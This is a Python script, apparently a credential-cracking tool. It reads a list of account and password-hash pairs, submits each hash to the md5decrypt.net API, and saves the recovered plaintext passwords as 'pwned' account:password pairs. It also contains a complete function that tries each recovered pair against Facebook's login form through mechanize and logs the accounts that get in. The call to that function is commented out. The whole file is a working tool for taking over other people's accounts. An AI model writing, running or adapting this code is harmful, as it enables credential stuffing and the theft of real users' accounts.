import sys,requests,mechanize,urllib3

 
if len(sys.argv) != 7:
    print("Use => %s <filename> <email> <typeHash> <code> <premium? 0 | 1 >  <out>" % sys.argv[0])
    print("Reference => https://md5decrypt.net/en/Api/")
    # print(len(sys.argv))
    sys.exit();
    
post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
   
browser = mechanize.Browser()
browser.addheaders = [('User-Agent',headers['User-Agent'])]
browser.set_handle_robots(False)
    
emailMdDec = sys.argv[2]
typeHash = sys.argv[3]
codeMd5 =  sys.argv[4]
premium =  sys.argv[5]
out =  sys.argv[6]

accountsTest = []
accountsDect = []


def readFile():
    filename = open(sys.argv[1]) 
    lines = filename.readlines()
    
    for item in lines:
        textLine = item.split(",")
        accountsTest.append({
            'account':textLine[0],
            'passw':textLine[1]
        })
def writeFile(item,passw):
     file1 = open("out/{0}".format(out),'a+')
     file1.write("{0}:{1}\n".format(item['account'],passw))
     file1.close()


def testFacebook(item,passw):
    print("=========================================================")
    print("Test facebook")
    respons= browser.open(post_url)
    try:
        
        
        if respons.code == 200:
            browser.select_form(nr=0)
            browser.form['email'] = item['account']
            browser.form['pass'] = passw
            response = browser.submit()
            response_data = str(response.read())
            print( not('Iniciar sesi' in response_data))
            # sys.exit();
            if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data or not('Iniciar sesi' in response_data):
                print('Your password is : ',passw)
                file1 = open("out/facebook_find.txt".format(out),'a+')
                file1.write("{0}:{1}\n".format(item['account'],passw))
                file1.close()
    except Exception  as e:
      print('An exception occurred')
      print( e)
  
  
def decrypt():
    # print(accountsTest)
    for item in accountsTest:
        # print(item["passw"])
        params = {
            'hash' :item['passw'].replace('\n', ''),
            'hash_type' :typeHash,
            'email' :emailMdDec,
            'code' :codeMd5,
            'premium' :premium,
        }
        resp = requests.get('https://md5decrypt.net/en/Api/api.php',params=params)
        respuesta = str(resp.content).split(":")
        # print(respuesta)
        # print(params)
        if(respuesta[0] != "b'ERROR CODE "  and respuesta[0] != "b''"):
          
            passw = str(resp.content).replace('b\'', '').replace('\'', '')
            print("{0}:{1} => pwned => {2}:{3}".format(item['account'],item['passw'],item['account'],passw))
            writeFile(item,passw)
            # testFacebook(item,passw)
        # print(resp.content)

  
readFile()
decrypt()
# print(accountsTest)